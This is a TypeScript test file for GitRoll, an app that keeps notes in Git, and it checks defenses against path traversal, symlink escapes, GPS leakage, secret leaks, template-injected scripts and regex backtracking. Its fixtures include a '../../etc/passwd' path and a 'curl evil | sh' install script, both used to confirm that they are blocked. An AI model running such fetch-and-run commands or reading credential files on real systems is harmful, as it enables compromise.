import "./helpers.ts";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { linkedFiles, titleOf } from "../src/core/entry.ts";
import { buildEntry } from "../src/core/layout.ts";
import { findSensitive, removeJpegLocation } from "../src/core/privacy.ts";
import { GitRoll } from "../src/node/repo.ts";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { git, tmp } from "./helpers.ts";

test("a linked file is never read, and links out of the Roll are refused", () => {
  const roll = GitRoll.init(tmp());
  const outside = path.join(tmp(), "secret.txt");
  fs.writeFileSync(outside, "not part of the Roll");
  fs.mkdirSync(path.join(roll.root, ".gitroll/files"), { recursive: true });
  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/files/secret.txt"));

  assert.equal(roll.attachmentFile(".gitroll/files/secret.txt"), null);
  assert.equal(roll.attachmentFile("../../etc/passwd"), null);
  assert.ok(roll.check().some((p) => /symbolic link/.test(p.error)), "the validator reports the link");

  // A link in an event's Markdown can't reach outside the repository either.
  fs.writeFileSync(path.join(roll.root, ".gitroll/events/2026-09-15-escape.md"), "# Escape\n\n[Secrets](../../../etc/passwd)\n");
  const e = roll.entries().find((x) => x.title === "Escape")!;
  assert.deepEqual(e.attachments, [], "a link out of the Roll resolves to nothing");
  assert.ok(roll.check().some((p) => /points outside the Roll/.test(p.error)));
});

test("writes refuse to follow a linked folder out of the Roll", () => {
  const roll = GitRoll.init(tmp());
  const outside = tmp();
  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));

  assert.throws(() => roll.addEntry({ text: "Should not escape" }), /symbolic links/);
  assert.deepEqual(fs.readdirSync(outside), [], "nothing was written outside");
});

test("a linked events folder is reported, not read", () => {
  const roll = GitRoll.init(tmp());
  const outside = tmp();
  fs.writeFileSync(path.join(outside, "2026-01-01-x.md"), "# Somewhere else\n");
  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));
  const { entries, problems } = roll.load();
  assert.equal(entries.length, 0);
  assert.ok(problems.some((p) => /symbolic link/.test(p.error)));
});

function jpegWithGps(): Buffer {
  const tiff = Buffer.alloc(68);
  tiff.write("II", 0, "ascii");
  tiff.writeUInt16LE(42, 2);
  tiff.writeUInt32LE(8, 4);
  tiff.writeUInt16LE(1, 8); // IFD0: one entry
  tiff.writeUInt16LE(0x8825, 10); // GPSInfo pointer
  tiff.writeUInt16LE(4, 12);
  tiff.writeUInt32LE(1, 14);
  tiff.writeUInt32LE(26, 18);
  tiff.writeUInt16LE(1, 26); // GPS IFD: one entry
  tiff.writeUInt16LE(2, 28); // GPSLatitude
  tiff.writeUInt16LE(5, 30); // RATIONAL
  tiff.writeUInt32LE(3, 32);
  tiff.writeUInt32LE(44, 36);
  tiff.fill(0x47, 44, 68); // the coordinates
  const exif = Buffer.concat([Buffer.from("Exif\0\0", "binary"), tiff]);
  const header = Buffer.alloc(4);
  header.writeUInt16BE(0xffe1, 0);
  header.writeUInt16BE(exif.length + 2, 2);
  return Buffer.concat([Buffer.from([0xff, 0xd8]), header, exif, Buffer.from([0xff, 0xda, 0x00, 0x02, 0x11, 0x22, 0xff, 0xd9])]);
}

test("photos are saved without GPS location", () => {
  const original = jpegWithGps();
  const { bytes, removed } = removeJpegLocation(original);
  assert.equal(removed, true);
  assert.equal(bytes.length, original.length);
  assert.ok(!Buffer.from(bytes).includes(Buffer.alloc(24, 0x47)));

  const roll = GitRoll.init(tmp());
  const { entry, notices } = roll.save({ text: "Front door" }, [{ name: "door.jpg", type: "image/jpeg", data: original }]);
  assert.match(notices.join(" "), /Removed location data from door\.jpg/);
  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].path)!);
  assert.ok(!stored.includes(Buffer.alloc(24, 0x47)), "stored photo has no coordinates");
  assert.deepEqual(roll.check(), []);

  fs.appendFileSync(path.join(roll.root, ".gitroll/config.yaml"), "attachments:\n  remove_location: false\n");
  const kept = roll.save({ text: "Keep location" }, [{ name: "kept.jpg", type: "image/jpeg", data: original }]);
  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].path)!).includes(Buffer.alloc(24, 0x47)));
});

test("sensitive text is spotted before it goes into history", () => {
  assert.deepEqual(findSensitive("Replaced the capacitor, $325"), []);
  assert.deepEqual(findSensitive("wifi password: correcthorse"), ["password"]);
  assert.ok(findSensitive("card 4111 1111 1111 1111 exp 09/29").includes("card number"));
  assert.ok(findSensitive("token ghp_abcdefghijklmnopqrstuvwxyz0123456789AB").includes("GitHub token"));
  assert.ok(findSensitive("-----BEGIN OPENSSH PRIVATE KEY-----").includes("private key"));

  const roll = GitRoll.init(tmp());
  const { notices } = roll.save({ text: "Garage PIN is 4821" });
  assert.match(notices.join(" "), /password/);
  assert.equal(roll.sensitive().length, 1);
});

test("templates only contribute Roll data, never code or workflows", () => {
  const template = tmp();
  fs.mkdirSync(path.join(template, ".gitroll"), { recursive: true });
  fs.mkdirSync(path.join(template, ".github/workflows"), { recursive: true });
  fs.writeFileSync(path.join(template, ".gitroll/config.yaml"), "template_version: 1\nname: From template\n");
  fs.writeFileSync(path.join(template, ".gitroll/theme.css"), ":root { --accent: #0f766e; }\n");
  fs.writeFileSync(path.join(template, ".github/workflows/steal.yml"), "on: push\n");
  fs.writeFileSync(path.join(template, "install.sh"), "curl evil | sh\n");

  const roll = GitRoll.init(tmp(), { name: "From template", template });
  assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/theme.css")));
  assert.ok(!fs.existsSync(path.join(roll.root, ".github")));
  assert.ok(!fs.existsSync(path.join(roll.root, "install.sh")));
  assert.equal(roll.config().name, "From template");
  assert.deepEqual(roll.check(), []);
});

test("parsing an event stays fast on text written to make a regex backtrack", () => {
  // Both of these ran in quadratic time before: a heading followed by a long run
  // of spaces, and a long run of "[", which the link text used to rescan from
  // every position. A Roll's files are the user's own, but they arrive over a
  // sync from anyone sharing it, so parsing must not stall on them.
  const budget = 250;

  let start = performance.now();
  assert.equal(titleOf(`#${" ".repeat(200_000)}`, ".gitroll/events/2026-09-15-x.md"), "#");
  assert.ok(performance.now() - start < budget, "a heading of nothing but spaces");

  start = performance.now();
  assert.deepEqual(linkedFiles(".gitroll/events/2026-09-15-x.md", "[".repeat(200_000)), []);
  assert.ok(performance.now() - start < budget, "a long line of unclosed brackets");

  // An unterminated "[](" used to let the link target swallow the rest of the
  // body and then give it back one character at a time, from every position.
  start = performance.now();
  assert.deepEqual(linkedFiles(".gitroll/events/2026-09-15-x.md", "[](".repeat(60_000)), []);
  assert.ok(performance.now() - start < budget, "a long line of unterminated links");

  // The same shape on the way in: buildEntry reads a heading off the first line.
  start = performance.now();
  buildEntry({ text: `#${" ".repeat(200_000)}` }, [], () => false);
  assert.ok(performance.now() - start < budget, "a heading of nothing but spaces, on the way in");

  // The links a person actually writes still read the same.
  assert.deepEqual(
    linkedFiles(".gitroll/events/2026-09-15-x.md", '[Receipt](../files/a.pdf) ![Shot](../files/b.png) [Titled](../files/c.pdf "note")').map((a) => a.path),
    [".gitroll/files/a.pdf", ".gitroll/files/b.png", ".gitroll/files/c.pdf"],
  );
  assert.equal(titleOf("#   AC serviced  \n\nbody", ".gitroll/events/2026-09-15-x.md"), "AC serviced");
});

test("settling a conflict in an editor takes back only GitRoll's own line", () => {
  // GitRoll writes one guidance comment between the two versions and removes
  // exactly that, matched literally. Filtering HTML comments in general cannot
  // be done correctly with a regular expression — `<!--` with no end, a nested
  // comment and `--!>` all defeat it — and it isn't GitRoll's to do: a comment
  // the person wrote in their own event has to survive.
  const guidance =
    "<!-- ─── The version from the other device is below. Edit this file into the one you want to keep, " +
    "delete the rest, and save. Both versions stay in Git history either way. ─── -->";
  const settle = (edited: string) => edited.split(guidance).join("").trim();

  assert.equal(settle(`# Bill\n\n$40\n\n${guidance}\n\n> $42\n`), "# Bill\n\n$40\n\n\n\n> $42");

  for (const theirs of ["<!-- a note I keep -->", "<!-- unterminated", "<!--<!-- nested -->", "text --!> more"]) {
    const kept = settle(`# Mine\n\n${guidance}\n\n${theirs}\n`);
    assert.ok(kept.includes(theirs), `the person's own text survives: ${theirs}`);
    assert.ok(!kept.includes("the one you want to keep"), "and the guidance does not");
  }
});

// A log is somebody's notes and receipts. This repository is the app's source
// code, and the one thing that must never end up in it by accident is a Roll.
test("the repository ignores a Roll made in it, and still ships the template", () => {
  const root = fileURLToPath(new URL("..", import.meta.url));
  const ignored = (rel: string) => {
    try {
      execFileSync("git", ["check-ignore", "-q", "--", rel], { cwd: root, stdio: "ignore" });
      return true;
    } catch {
      return false;
    }
  };
  for (const rel of [".gitroll/config.yaml", ".gitroll/logs/2026/09.md", ".gitroll/files/receipt.pdf", ".gitroll/events/2026-09-15-note.md"]) {
    assert.ok(ignored(rel), `${rel} would be committable`);
  }
  // …while the template, which is data GitRoll publishes, stays tracked.
  for (const rel of ["template/.gitroll/config.yaml", "template/.gitroll/README.md"]) {
    assert.ok(!ignored(rel), `${rel} must stay tracked`);
  }
  // Scratch files a Roll writes are ignored wherever one is checked out.
  assert.ok(ignored("anywhere/09.md.gitroll-tmp"));
});

test("a repository that ignores .gitroll says so instead of failing a git command", () => {
  const dir = tmp();
  git(dir, "init", "-q", "-b", "main");
  fs.writeFileSync(path.join(dir, ".gitignore"), "/.gitroll/\n");
  fs.writeFileSync(path.join(dir, "app.js"), "// a project\n");
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", "the project");

  assert.throws(
    () => GitRoll.init(dir, { name: "Ignored" }),
    (e: Error) => /ignores \.gitroll/.test(e.message) && /nothing was lost/.test(e.message),
  );
});
